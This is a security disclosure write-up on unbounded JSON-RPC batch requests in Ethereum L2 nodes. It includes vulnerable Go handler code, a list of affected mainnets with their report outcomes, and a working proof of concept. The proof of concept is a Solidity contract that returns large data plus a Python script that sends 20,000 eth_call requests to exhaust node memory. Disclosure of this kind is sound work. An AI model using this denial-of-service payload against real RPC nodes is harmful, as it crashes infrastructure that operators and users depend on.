# Misconfiguration of Ethereum RPC Series 2: Unlimited Batch Requests

## Description

A vulnerability exists in the batch request handling of Ethereum-based L2 implementations, where there is no upper limit on the number or size of requests included in a batch. This allows attackers to craft malicious batch requests containing a large volume of memory-intensive operations, resulting in the exhaustion of server resources and potential crashes.

The following code snippet illustrates a typical implementation where all responses are stored in memory before being returned to the client. Similar patterns are observed across multiple RPC implementations:

```go
func (s *Server) handleBatchRequest(httpRequest *http.Request, w http.ResponseWriter, data []byte) int {
    requests, err := s.parseRequests(data)
    if err != nil {
        handleError(w, err)
        return 0
    }

    responses := make([]types.Response, 0, len(requests))

    for _, request := range requests {
        req := handleRequest{Request: request, HttpRequest: httpRequest}
        response := s.handler.Handle(req)
        responses = append(responses, response)
    }

    respBytes, _ := json.Marshal(responses)
    _, err = w.Write(respBytes)
    if err != nil {
        log.Error(err)
        return 0
    }
    return len(respBytes)
}
```

## Exploitation Steps

1. **Attack Contract Crafting**: An attacker deploys a smart contract that returns extremely large data.
2. **Batch Request Construction**: The attacker constructs a batch request to call the smart contract multiple times, and then send the batch request to the RPC client.

## Impact

A single HTTP packet of relatively small size can exhaust all available memory on a node with significant RAM, leading to a node crash.

## Affected Vendors

- **Metis Mainnet**: Reported in <span style="color:blue;">February 2024</span>, but no response was received.  
- **Linea Mainnet**: Reported in <span style="color:blue;">December 2023</span>, but no response was received.  
- **Scroll Mainnet**: Reported in <span style="color:blue;">December 2023</span>, and rewarded me 5K USDC bug bounty which equivalent to <span style="color:red;">medium severity</span>.
- **Boba Network Mainnet**: Reported in <span style="color:blue;">July 2023</span>, and acknowledged as a duplicate report.
- **Polygon zkEVM Mainnet**: Reported in <span style="color:blue;">July 2023</span> and confirmed as <span style="color:red;">medium severity</span>.  

## POC

First, deploy the following smart contract on L2 blockchain.

```solidity
pragma solidity ^0.8.0;

contract LargeDataReturn {
    function getLargeData() public pure returns (bytes memory) {
        uint256 length = 2 ** 22 - 2 * 16;
        assembly {
            return (0, length)
        }
    }
}
```

Next, replace the smart contract address in the following Python script. The Python script creates a batch request containing 20,000 eth_call. This single batch request can cause the L2 node to crash immediately.

```python
import requests
import json
from eth_utils import keccak, to_hex


hash = keccak(text='getLargeData()')
selector = to_hex(hash[:4])
print(selector)


headers = {'content-type': 'application/json'}
url = 'http://127.0.0.1:8546/'


payload = [
    {
        "jsonrpc": "2.0",
        "method": "eth_call",
        "params": [{
            "to": "0xD296F550529E625209EE5D39d26DA7f32D412f3a",
            "data": selector,
        }, "latest"],
        "id": i
    }
    for i in range(20000)
]
payload = json.dumps(payload)

print("Payload length:",len(payload) / (1024 * 1024))

response = requests.post(url, data=payload, headers=headers)

print(len(response.content))
```